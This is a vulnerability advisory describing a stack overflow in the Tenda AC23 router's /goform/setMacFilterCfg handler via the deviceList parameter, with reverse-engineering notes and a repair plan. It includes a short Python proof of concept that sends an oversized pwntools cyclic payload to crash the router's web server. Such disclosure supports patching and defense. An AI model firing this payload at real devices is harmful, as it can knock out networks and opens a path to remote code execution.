# Tenda AC23_V16.03.07.52 has a stack overflow in /goform/setMacFilterCfg through the parameter deviceList

## Basic Information

Vulnerability manufacturer: Shenzhen Jixiang Tenda Technology Co., Ltd.

Vulnerability level: high risk

Manufacturer's official website: https://www.tenda.com.cn

Affected object type: network equipment

Affected product: Tenda AC23

Affected product version: Tenda AC23_V16.03.07.52

Is it a product component vulnerability: No



## 1. Vulnerability Overview

Tenda AC23 is a wireless router from China's Tenda company.

Tenda AC23 has a buffer overflow vulnerability. The vulnerability is caused by the failure of the parameter deviceList in the file /goform/setMacFilterCfg to correctly verify the length of the input data. Attackers can exploit this vulnerability to execute arbitrary code on the system.

## 2. Vulnerability Details

Ida analyzes the binary file /bin/httpd and can see that the macFIlterType parameter passes through the parameter, while the deviceList parameter has no detection

![image-20250721135828859](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721135828859.png)

This parameter will eventually be used as the first parameter of sub_46C940 and strcpyed to the stack. Since there is no detection, the attacker can overflow the stack, control the return address or construct a ROP chain getshell

gdb cannot test the offset due to the lack of symbol table. If the offset is tested, getshll can be used to cause greater damage

![image-20250721140039482](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721140039482.png)

![image-20250721142913640](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721142913640.png)

POC

```
from pwn import *
import requests

url = "http://192.168.87.135/goform/setMacFilterCfg"

cookie = {"Cookie":"password=12345"}
data = {"macFilterType": "black", "deviceList": b"\r" + cyclic(0x600)}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```



## 3. Impact of the Vulnerability

1. Attackers can exploit this vulnerability to RCE
1. Attackers can exploit this vulnerability to cause service crash

## 4. Repair plan

1. Contact relevant vendors to obtain security patches and fix vulnerabilities in a timely manner
2. Contact relevant security vendors to update security blocking strategies in a timely manner
3. Temporarily perform security checks on interface parameters

‍